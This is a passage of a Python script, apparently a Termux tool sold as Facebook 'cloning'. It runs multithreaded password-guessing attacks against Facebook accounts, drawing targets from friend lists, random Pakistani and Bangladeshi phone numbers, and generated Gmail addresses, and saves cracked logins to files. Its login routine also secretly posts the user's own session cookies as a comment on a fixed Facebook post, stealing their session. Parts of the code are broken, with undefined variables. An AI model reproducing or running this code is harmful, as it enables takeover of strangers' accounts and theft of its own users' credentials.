'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z96J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4326.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F134D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4489.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E520F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4692.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N190E) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4579.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T243T) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4582.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M192B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4449.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M388V) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4698.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R604G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4481.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W949F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4856.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W190L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4866.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A68X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4617.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K789C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4708.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O217D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4543.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A875Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4533.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H64V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4268.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R649A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V309L) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4303.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T769C) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4649.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O207X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4867.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I589E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4213.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z350I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B36Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4238.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G519V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4512.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L26U) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4442.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G283U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4806.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S576N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4275.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T500F) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4727.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I955S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4808.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V593U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4255.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P311E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4461.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y106Z) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4729.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N847A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4688.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V346D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4226.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H686O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4578.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L736R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4479.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K948C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4573.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A774O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A515E) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4393.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I401Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B678X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4234.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K778K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4686.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H3R) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A182A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4592.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L84Y) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4876.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S700L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4267.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M906R) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4759.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H562N) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4454.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B617O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4500.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T488Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4520.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C640D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4744.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z836C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H968T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4205.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U605M) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4599.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N17Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4793.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R290J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4269.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C263Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4378.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L828U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4900.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K797H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4675.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y628S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4498.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q429E) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4631.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q902L) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4336.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I516Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4425.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N606C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4421.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K515B) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4694.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L45C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4260.55 Chrome/105.0.0.0 Safari/537.36",'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1','Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7102 Build/KOT49H)',
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)'])

logo=(""""""""" \033[1;92m
d8888b.  .d8b.  db       .d88b.   .o88b. db   db 
88  `8D d8' `8b 88      .8P  Y8. d8P  Y8 88   88 
88oooY' 88ooo88 88      88    88 8P      88ooo88 
88~~~b. 88~~~88 88      88    88 8b      88~~~88 
88   8D 88   88 88booo. `8b  d8' Y8b  d8 88   88 
Y8888P' YP   YP Y88888P  `Y88P'   `Y88P' YP   YP 
----------------------------------------------
 Owner      :    RASHID BALOUCH
 Github     :    RASHID-XD888
 Version    :    2.0.1
----------------------------------------------""")              
        
def linex():
        print('\033[1;92m ----------------------------------------------')
   

def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;33m : '+name)
                print(' \033[1;92mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;32m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;32m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;32mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;32mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;32mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;35mHow many ids you went to clone ?\033[1;92m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;97m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' Try Methods ')
        linex()
        print(' [1] Method 1  \n [2] Method 2 \n [3] Method 3 ')
        linex()
        mthd = input(' Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;33m Dumping friend list...\033[1;92m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;92m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print('Total account : \033[1;92m'+total_ids+f' \033[1;33m>\033[1;32m> \033[1;92mMethod -> \033[1;92mM{mthd}')
                        print("\033[1;92mUse flight mode for speed up\033[1;92m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;92m')
                linex()
                print(' TheSyed-has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python Syed.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File cloning\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' File location\033[1;92m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' Try Methods ')
                                linex()
                                print(' [1] BEST CLONING ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('Total account : \033[1;92m'+total_ids+f' \033[1;33m\033[1;35m \033[1;92mMethod  \033[1;92mM{mthd}')
                                        print("\033[1;92mUse flight mode for speed up\033[1;92m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;92m')
                                linex()
                                print(' The-Syed-has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python Pro.py')
                        elif xd in ['2','02']:
                                import dump
                                dump.Main()
                        elif xd in ['3','03']:
                                public()
                        elif xd in ['4','04']:
                                clear()
                                print(' [1] Pak cloning\n [2] Bd cloning\n [3] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        gmail()
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
                        elif xd in ['6','06']:
                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                os.system(f'xdg-open https://facebook.com/groups/291183553213655/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://facebook.com/groups/291183553213655/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://facebook.com/groups/291183553213655/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print("\033[1;32m Your Not Premium User...!\033[1;97m");time.sleep(1)
                        clear()
                        print('\033[1;32m First Read Note : ')
                        print("\033[1;35m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;97m")
                        linex()
                        print(' \033[1;32mYour Key Not Registered\033[1;97m')
                        print(f" \033[1;92mYour Key : {fkeyx}")
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;97m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;97m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        print(" Your Subscription Date Expire")
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RS Sir, I Need To Buy Your Paid Sk PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python_Syed.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;32m Code example: 0306,0315,0335,0345')
                code = input('\033[1;92m put code: ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;92m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as Sk:     
                        clear()
                        tl = str(len(user))
                        print('Total account : \033[1;32m'+tl)
                        print(f'\033[1;92m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;92mUse flight mode for speed up\033[1;92m')
                        linex()
                        for guru in user:
                            uid = kode+guru
                            pwx = [guru,uid]
                            yaari.submit(rcrack,uid,pwx,tl)
                print('\033[1;92m')
                linex()
                print(' The Syed-has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python Pro.py')
def bd():
                user=[]
                clear()
                print('\033[1;32m Code example: 016,017,018,019')
                code = input('\033[1;92m put code: ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;92m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as Sk:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;92m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;92mUse flight mode for speed up\033[1;92m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                Sk.submit(rndm,ids,passlist)
                print('\033[1;92m')
                linex()
                print(' The-Syed-has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python -RS-.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;92m example: muhammad, ali, sajjad, faizan\033[1;92m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;92m example: khan, ahmad, ali \033[1;92m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as Sk:
                        total = str(len(fo))
                        clear()
                        print('Total account : \033[1;92m'+total)
                        print("\033[1;92mUse flight mode for speed up\033[1;97m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+'123']
                                Sk.submit(rndm,ids,passlist)
                print('\033[1;97m')
                linex()
                print(' TheSyed-has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python Syed.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;92m [RASHID] %s|\033[1;32mOK:-%s \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(zf)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Sk=session.cookies.get_dict().keys()
                        if "c_user " in Sk:    
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m BALOCH-OK %s | %s'%(ids,pas))
                                open('/sdcard/RASHID-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;31m BALOCH-CP '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/RASHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 